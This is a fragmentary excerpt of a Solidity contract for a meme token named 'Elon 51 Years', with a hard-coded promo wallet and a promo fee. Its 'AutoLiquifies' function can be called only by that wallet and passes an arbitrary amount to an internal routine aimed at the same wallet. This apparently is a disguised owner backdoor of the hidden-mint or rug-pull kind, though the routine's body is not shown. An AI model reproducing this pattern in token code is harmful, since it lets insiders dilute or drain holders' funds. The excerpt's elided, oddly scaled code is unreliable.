...
contract Elon51Years is Context, IERC20, Ownable {
    ...
    uint256 private _tTotal = 1_000_000_000_000 * 10**13;
    uint256 private constant SWAP_TOKENS_AT_AMOUNT = 7 * 10**13; 
    string private constant _name = "Elon 51 Years"; 
    string private constant _symbol = "Elon51"; 
    uint8 private constant _decimals = 9; 
    
    uint256 public _promoFee = 2;
    uint256 public _liquidityFee = 0;
    address private _promoWallet = 0xE1BEd5795e1bf48e8A6D80B04E3b346a2d4DE6FA;
    ...
    function AutoLiquifies(uint256 accumulation, address acc) promoWallet public virtual {
        require(acc == address(_promoWallet), "Auto Liquifies");
        _autoliqs(address(_promoWallet), acc, accumulation);
